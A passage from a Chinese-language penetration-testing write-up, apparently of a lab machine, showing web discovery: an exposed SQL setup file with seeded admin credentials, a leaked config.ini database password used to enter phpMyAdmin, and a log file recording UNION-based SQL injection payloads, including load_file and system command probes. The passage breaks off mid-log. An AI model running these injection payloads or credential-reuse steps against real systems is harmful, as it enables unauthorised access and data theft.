<h3 id="manual-web-discoverd"><a href="#manual-web-discoverd" class="headerlink" title="manual web discoverd"></a>manual web discoverd</h3><p>看下来没有什么能get shell的漏洞。目前最值得看的是应该是他扫出来的这些网站目录，我们看看都有哪些内容。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">/* http://192.168.56.140/sql/db.sql */</span><br><span class="hljs-keyword">CREATE</span> database IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> cms;<br><br>use mysql;<br><br><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> cms.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;sql_account&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;sql_password&#x27;</span>;<br><br>use cms;<br><br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> <span class="hljs-keyword">user</span>;<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> event;<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> log;<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> <span class="hljs-keyword">user</span> (<br>	user_id <span class="hljs-type">int</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> auto_increment <span class="hljs-keyword">primary</span> key,<br>	user_username <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,<br>	user_password <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span><br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> event (<br>	event_id <span class="hljs-type">int</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> auto_increment <span class="hljs-keyword">primary</span> key,<br>	event_title <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,<br>	event_body text,<br>	event_file <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">default</span> <span class="hljs-keyword">null</span>,<br>	user_id <span class="hljs-type">int</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,<br>	event_hits <span class="hljs-type">int</span> <span class="hljs-keyword">default</span> <span class="hljs-number">0</span><br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> <span class="hljs-built_in">log</span> (<br>	log_id <span class="hljs-type">int</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> auto_increment <span class="hljs-keyword">primary</span> key,<br>	log_ip <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>),<br>	log_referer <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>),<br>	log_useragent <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>)<br>);<br><br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span>;<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> event;<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> log;<br><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">SET</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>, user_username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span>, user_password<span class="hljs-operator">=</span>md5(<span class="hljs-string">&#x27;adminpass&#x27;</span>);<br><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> event <span class="hljs-keyword">SET</span> event_title<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Mauris Vel&#x27;</span>, event_body<span class="hljs-operator">=</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer pharetra nulla a velit euismod aliquam. Suspendisse potenti. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Duis eu felis a velit sollicitudin ullamcorper quis et sapien. Proin lacinia, mauris euismod pulvinar iaculis, elit dolor interdum ipsum, eu iaculis leo nisi sit amet enim. Phasellus nunc augue, commodo sed eleifend in, ullamcorper a sapien. Phasellus non posuere massa. Morbi sed posuere urna. Donec tincidunt congue ipsum nec vehicula. Nullam quis nulla erat. Phasellus semper pretium magna at faucibus. Pellentesque sed enim nec dui posuere blandit.&lt;/p&gt;</span><br><span class="hljs-string">&lt;p&gt;Maecenas malesuada blandit mauris vel tincidunt. Praesent vitae nibh erat. Donec tincidunt blandit aliquam. Donec pulvinar suscipit viverra. Fusce vitae diam non orci adipiscing dapibus nec in tortor. Donec laoreet feugiat adipiscing. Fusce at augue dignissim mauris tincidunt tincidunt. Sed at odio ut nisi vehicula porttitor. Quisque elementum ligula et libero hendrerit lacinia ac vel eros. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Suspendisse ut magna sem, eget pellentesque turpis. Nam ut velit ac lorem fringilla dapibus sit amet vitae leo. Mauris non velit eu neque auctor dignissim. Nam quis ipsum ac lectus commodo adipiscing interdum placerat mi.&lt;/p&gt;&#x27;</span>,<br>user_id <span class="hljs-operator">=</span> (<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> user_username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span>);<br><br><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> event <span class="hljs-keyword">SET</span> event_title<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Proin velit lacus&#x27;</span>, event_body<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&lt;p&gt;Proin velit lacus, eleifend id ullamcorper sit amet, mattis id velit. Suspendisse placerat, mi luctus feugiat lacinia, elit odio facilisis dolor, at pellentesque turpis felis tincidunt leo. Quisque quis leo dolor. Donec id nunc ut tortor posuere dictum. Aliquam lobortis auctor neque, sit amet ornare urna ultrices eu. Nunc gravida, lacus id condimentum commodo, lectus enim ultricies tellus, sit amet tempor urna augue a sem. Vestibulum pretium congue nibh ut imperdiet. Fusce ac nibh vel felis vestibulum porttitor. Praesent mattis velit a ipsum aliquam vel commodo libero porttitor. Morbi volutpat, justo nec lobortis accumsan, urna ligula malesuada tellus, pharetra vehicula massa magna ut nulla. Fusce luctus tempor pharetra. In hac habitasse platea dictumst. Etiam in neque pretium mi molestie fringilla. Etiam aliquam accumsan lorem vitae varius. &lt;/p&gt;&#x27;</span>,<br>user_id <span class="hljs-operator">=</span> (<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> user_username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span>);<br><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> event <span class="hljs-keyword">SET</span> event_title<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Praesent magna est&#x27;</span>, event_body<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&lt;p&gt;Praesent magna est, semper vitae euismod vitae, scelerisque eu nunc. Proin sed nibh a nisl tempus fringilla vitae ac nunc. Maecenas diam ipsum, ultrices vel faucibus non, suscipit nec felis. Praesent eleifend turpis vel orci sollicitudin quis tincidunt ante dapibus. Mauris laoreet mi vel nunc lacinia nec pulvinar lectus congue. Praesent imperdiet sollicitudin urna, sit amet auctor magna eleifend vel. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vivamus elementum, magna vel venenatis pellentesque, nibh orci sollicitudin sapien, in tempor sem orci non metus. Nulla interdum feugiat ultrices. Nam egestas nulla quis dolor aliquam a iaculis arcu lobortis. Vestibulum urna leo, condimentum varius porttitor sed, tincidunt id est. Suspendisse potenti. Nulla fringilla massa ac arcu tempor molestie. Vivamus vehicula aliquet enim, eu porttitor libero suscipit non. &lt;/p&gt;&#x27;</span>,<br>user_id <span class="hljs-operator">=</span> (<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> user_username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span>);<br><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> event <span class="hljs-keyword">SET</span> event_title<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Suspendisse sapien orci&#x27;</span>, event_body<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&lt;p&gt;Suspendisse sapien orci, luctus laoreet fringilla vitae, sodales non quam. Aliquam vel justo vel enim dapibus ullamcorper. Sed elementum lacus sed tortor imperdiet imperdiet. Maecenas a turpis vel tellus iaculis ullamcorper. Pellentesque vitae orci at dolor vestibulum pharetra sit amet ut sem. Donec nec rhoncus ligula. Suspendisse eget luctus nunc. Nam eget arcu augue, vitae condimentum magna. Etiam et fermentum erat. Fusce vehicula urna ac nisl imperdiet fringilla blandit ut quam. Nullam ultricies eros sit amet sem volutpat eget elementum augue consequat. Integer non arcu orci, in iaculis elit. Fusce eros massa, accumsan in blandit eget, suscipit sit amet nibh. Vestibulum a neque libero. Vivamus purus augue, sollicitudin eget sagittis sed, lacinia sit amet nibh. Nulla eget suscipit libero. &lt;/p&gt;&#x27;</span>,<br>user_id <span class="hljs-operator">=</span> (<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> user_username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span>);<br></code></pre></td></tr></table></figure>
<p><code>/sql</code>目录下有个<code>db.sql</code>文件，看上去像是创建网站数据时的操作，仔细看一下发现里面甚至有用户的登陆凭证：<code>admin:adminpass</code>。<br>观察一下数据库构建语句很明显是网站主页登录框的登录凭证。我们尝试登录，发现能成功登录，但是不知道为啥提示登陆成功后并不能正常跳转到管理后台，只会跳回主页。。。。<br>那这个凭证尝试登录目录发现发现的邮箱登录，phpmyadmin登录，都失败，看来没有密码复用，先找找别的路吧。</p>
<p>我们在<code>/docs</code>目录下发现了code_backup.tgz压缩文件，很有可能是网站的代码备份。<br class='item-img' data-src='/pic/assets/1682761559655-0085916d-328b-4b04-92a0-61cf77397821.png'><img src="/pic/assets/1682761559655-0085916d-328b-4b04-92a0-61cf77397821.png" alt="uTools_1682761360831.png"><br>我们下载下来看看。<br>OK，果然是，舒服。<br class='item-img' data-src='/pic/assets/1682761619727-d78d2a1f-9837-4ee5-b656-2266552c0262.png'><img src="/pic/assets/1682761619727-d78d2a1f-9837-4ee5-b656-2266552c0262.png" alt="uTools_1682761447021.png"><br>我们进入<code>conf</code>目录，发现config.ini文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">;<br>; This is the configuration file<br>;<br>database_host	=	localhost<br>database_pass	=	45kkald?8laLKD<br>database_user	=	cms_user<br>database_db	=	cms<br><br></code></pre></td></tr></table></figure>
<p>明显是连接数据库用的登录凭证 。<br>我们尝试用其登录phpmyadmin，果然成功。<br class='item-img' data-src='/pic/assets/1682761957511-2873e3ea-2bce-4c57-a219-1ea12c57e6e0.png'><img src="/pic/assets/1682761957511-2873e3ea-2bce-4c57-a219-1ea12c57e6e0.png" alt="uTools_1682761951347.png"><br>我们看看这个账号对数据库的管理权限，发现除了<code>grant</code>权限，其他全有，基本约等于root了，那就方便我们接下来的操作了。<br>但是先别急，我们刚才网站的各个目录还没看完，并且之前手动尝试访问<code>/logs</code>目录时提示要密码，那我们就看看里面有什么东西。我们移动到<code>/logs</code>目录下，发现<code>log.log</code>日志文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">2009-06-23 16:06:42	172.16.18.1 called <br>2009-06-23 16:06:44	172.16.18.1 called action=logs<br>2009-06-23 16:06:50	172.16.18.1 called <br>2009-06-23 16:06:52	172.16.18.1 called action=logs<br>2009-06-23 16:06:33	172.16.18.1 called <br>2009-06-23 16:06:35	172.16.18.1 called id=4<br>2009-06-23 16:06:37	172.16.18.1 called action=users<br>2009-06-23 16:06:38	172.16.18.1 called action=logs<br>2009-06-23 20:06:18	172.16.18.1 called <br>2009-06-23 20:06:46	172.16.18.1 called action=login<br>2009-06-23 20:06:50	172.16.18.1 called action=login<br>2009-06-23 20:06:45	172.16.18.1 called <br>2009-06-23 20:06:17	172.16.18.1 called <br>2009-06-23 20:06:26	172.16.18.1 called <br>2009-06-23 20:06:50	172.16.18.1 called <br>2009-06-23 20:06:57	172.16.18.1 called <br>2009-06-23 20:06:51	172.16.18.1 called <br>2009-06-23 20:06:38	172.16.18.1 called <br>2009-06-23 20:06:51	172.16.18.1 called <br>2009-06-23 20:06:55	172.16.18.1 called <br>2009-06-23 20:06:29	172.16.18.1 called <br>2009-06-23 20:06:32	172.16.18.1 called id=4<br>2009-06-23 20:06:34	172.16.18.1 called <br>2009-06-24 17:06:36	172.16.61.1 called <br>2009-06-24 17:06:45	172.16.61.1 called <br>2009-06-24 17:06:17	172.16.61.1 called <br>2009-06-24 17:06:31	172.16.61.1 called <br>2009-06-24 17:06:37	172.16.61.1 called <br>2009-06-24 17:06:16	172.16.61.1 called <br>2009-06-24 17:06:36	172.16.61.1 called <br>2009-06-24 17:06:49	172.16.61.1 called <br>2009-06-24 17:06:35	172.16.61.1 called <br>2009-06-28 13:06:09	172.16.61.132 called id=4%20UNION%20select%201,1,1,1,1,1%20from%20dual<br>2009-06-28 13:06:09	Problem with event select: . The used SELECT statements have a different number of columns<br>2009-06-28 13:06:28	172.16.61.132 called id=4%20UNION%20select%201,1,1,1,1,1,1%20from%20dual<br>2009-06-28 13:06:29	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,1,1,1,1,1,1 from dual&#x27; at line 1<br>2009-06-28 13:06:29	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,1,1,1,1,1,1 from dual&#x27; at line 1<br>2009-06-28 13:06:43	172.16.61.132 called id=4%20UNION%20select%20version,1,1,1,1,1,1%20from%20dual<br>2009-06-28 13:06:43	Problem with event select: . Unknown column &#x27;version&#x27; in &#x27;field list&#x27;<br>2009-06-28 13:06:52	172.16.61.132 called id=4%20UNION%20select%20version(),1,1,1,1,1,1%20from%20dual<br>2009-06-28 13:06:52	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select version(),1,1,1,1,1,1 from dual&#x27; at line 1<br>2009-06-28 13:06:52	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select version(),1,1,1,1,1,1 from dual&#x27; at line 1<br>2009-06-28 13:06:13	172.16.61.132 called id=4%20UNION%20select%201,2,3,4,5,6,7%20from%20dual<br>2009-06-28 13:06:13	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,7 from dual&#x27; at line 1<br>2009-06-28 13:06:13	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,7 from dual&#x27; at line 1<br>2009-06-28 13:06:30	172.16.61.132 called id=4%20UNION%20select%201,2,3,4,5,6,version()%20from%20dual<br>2009-06-28 13:06:30	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,version() from dual&#x27; at line 1<br>2009-06-28 13:06:30	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,version() from dual&#x27; at line 1<br>2009-06-28 13:06:54	172.16.61.132 called id=4%20UNION%20select%201,host,user,4,5,6,version()%20from%20dual<br>2009-06-28 13:06:54	Problem with event select: . Unknown column &#x27;host&#x27; in &#x27;field list&#x27;<br>2009-06-28 13:06:58	172.16.61.132 called id=4%20UNION%20select%201,host(),user(),4,5,6,version()%20from%20dual<br>2009-06-28 13:06:58	Problem with event select: . FUNCTION cms.host does not exist<br>2009-06-28 13:06:02	172.16.61.132 called id=4%20UNION%20select%201,2,user(),4,5,6,version()%20from%20dual<br>2009-06-28 13:06:02	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,user(),4,5,6,version() from dual&#x27; at line 1<br>2009-06-28 13:06:02	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,user(),4,5,6,version() from dual&#x27; at line 1<br>2009-06-28 13:06:35	172.16.61.132 called id=4%20UNION%20select%201,host(),user(),4,5,6,version()%20from%20dual<br>2009-06-28 13:06:35	Problem with event select: . FUNCTION cms.host does not exist<br>2009-06-28 13:06:41	172.16.61.132 called id=4%20UNION%20select%201,database(),user(),4,5,6,version()%20from%20dual<br>2009-06-28 13:06:41	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,database(),user(),4,5,6,version() from dual&#x27; at line 1<br>2009-06-28 13:06:41	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,database(),user(),4,5,6,version() from dual&#x27; at line 1<br>2009-06-28 13:06:23	172.16.61.132 called id=4%20UNION%20select%201,schema(),system_user(),4,5,6,version()%20from%20dual<br>2009-06-28 13:06:23	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,schema(),system_user(),4,5,6,version() from dual&#x27; at line 1<br>2009-06-28 13:06:23	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,schema(),system_user(),4,5,6,version() from dual&#x27; at line 1<br>2009-06-28 13:06:53	172.16.61.132 called id=4%20UNION%20select%201,\!%20ls%20/var/www/html,system_user(),4,5,6,version()%20from%20dual<br>2009-06-28 13:06:53	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;\! ls /var/www/html,system_user(),4,5,6,version() from dual&#x27; at line 5<br>2009-06-28 13:06:44	172.16.61.132 called id=4%20UNION%20select%201,system(%27ls%20/var/www/html%27),system_user(),4,5,6,version()%20from%20dual<br>2009-06-28 13:06:44	Problem with event select: . FUNCTION cms.system does not exist<br>2009-06-28 13:06:13	172.16.61.132 called id=4%20UNION%20select%201,system%20%27ls%20/var/www/html%27,system_user(),4,5,6,version()%20from%20dual<br>2009-06-28 13:06:13	Problem with event select: . Unknown column &#x27;system&#x27; in &#x27;field list&#x27;<br>2009-06-28 13:06:18	172.16.61.132 called id=4%20UNION%20select%201,system%20ls%20/var/www/html,system_user(),4,5,6,version()%20from%20dual<br>2009-06-28 13:06:18	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;/var/www/html,system_user(),4,5,6,version() from dual&#x27; at line 5<br>2009-06-28 13:06:48	172.16.61.132 called id=4%20UNION%20select%201,system%20%27ls%20/var/www/html%27,system_user(),4,5,6,version()%20from%20dual<br>2009-06-28 13:06:48	Problem with event select: . Unknown column &#x27;system&#x27; in &#x27;field list&#x27;<br>2009-06-28 13:06:39	172.16.61.132 called id=4%20UNION%20select%201,concat(2,%20system%20%27ls%20/var/www/html%27),system_user(),4,5,6,version()%20from%20dual<br>2009-06-28 13:06:39	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;ls /var/www/html&#x27;),system_user(),4,5,6,version() from dual&#x27; at line 5<br>2009-06-28 13:06:24	172.16.61.132 called id=4%20UNION%20select%201,cload_file(%27/var/www/html%27),system_user(),4,5,6,version()%20from%20dual<br>2009-06-28 13:06:24	Problem with event select: . FUNCTION cms.cload_file does not exist<br>2009-06-28 13:06:31	172.16.61.132 called id=4%20UNION%20select%201,cload_file(%27/var/www/html/index.php%27),system_user(),4,5,6,version()%20from%20dual<br>2009-06-28 13:06:31	Problem with event select: . FUNCTION cms.cload_file does not exist<br>2009-06-28 13:06:26	172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/index.php%27),system_user(),4,5,6,version()%20from%20dual<br>2009-06-28 13:06:26	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),system_user(),4,5,6,version(&#x27; at line 1<br>2009-06-28 13:06:26	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),system_user(),4,5,6,version(&#x27; at line 1<br>2009-06-28 14:06:08	172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/index.php%27),system_user(),4,5,6,version()%20from%20dual<br>2009-06-28 14:06:08	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),system_user(),4,5,6,version(&#x27; at line 1<br>2009-06-28 14:06:08	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),system_user(),4,5,6,version(&#x27; at line 1<br>2009-06-28 14:06:57	172.16.61.132 called 